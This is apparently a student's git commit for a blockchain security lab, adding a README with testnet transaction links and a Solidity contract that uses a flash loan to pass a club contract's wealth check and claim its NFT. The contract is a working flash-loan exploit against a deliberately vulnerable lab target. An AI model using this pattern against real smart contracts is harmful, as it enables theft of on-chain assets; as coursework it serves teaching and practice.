ac1ee1921e2f31452037105a2a01a46baf9cdc71
alan890104 <alan890104@gmail.com>
2023-04-16 01:13:34 +0800

    first commit

---
+++ README.md
@@ -0,0 +1,13 @@
+# 311551044-bdaf-lab6
+
+[Lab6](https://bdaf.notion.site/Lab6-Open-Sesame-with-Flashloan-7cd5353a24764d109a6906ecbdc68578)
+
+## Description
+
+`My Wallet` | 0xCAFfeAcFf53Ba22c9283b89a874adc4808ece925
+
+- [Deployed Attack Contract](https://goerli.etherscan.io/address/0xf26dacc72aeb828b80cd699364314df2988269f3)
+
+- [Flashloan Transaction](https://goerli.etherscan.io/tx/0x5112a126352e7770a50f3065672ae2d696ff1ecb7a56cbaf50923b0b5410093b)
+
+- [Transfer NFT Transaction](https://goerli.etherscan.io/tx/0x091dbfb721e3213e5f3b4ab5639db303537f7cfc20464beb24ca8fff80736ddf)
---
+++ attack.sol
@@ -0,0 +1,49 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.8.0 <0.9.0;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+
+interface IClub {
+    function iDeclareBeingRich() external;
+}
+
+interface IPool {
+    function flashloan(address borrower, uint256 amount) external;
+}
+
+contract Attack is Ownable {
+    // The address of the bank token
+    address public bankToken;
+    // The address of the pool
+    address public pool;
+    // The address of the club
+    address public club;
+
+    constructor(address _token, address _pool, address _club) {
+        // Set the addresses of the bank token, pool, and club
+        bankToken = _token;
+        pool = _pool;
+        club = _club;
+    }
+
+    // Attack the pool
+    function attack() external onlyOwner {
+        // Call the flashloan function of the pool contract with this contract's address and 1000001 bank tokens
+        IPool(pool).flashloan(address(this), 1000001e18);
+    }
+
+    // Execute with money
+    function executeWithMoney(uint256 amount) external {
+        // Call to engage the rich club in the club contract
+        IClub(club).iDeclareBeingRich();
+        // Transfer the specified amount of bank tokens to the pool contract
+        IERC20(bankToken).transfer(pool, amount);
+    }
+
+    // Transfer NFT to myself
+    function transferNFT(uint256 tokenId) external onlyOwner {
+        IERC721(club).safeTransferFrom(address(this), msg.sender, tokenId);
+    }
+}
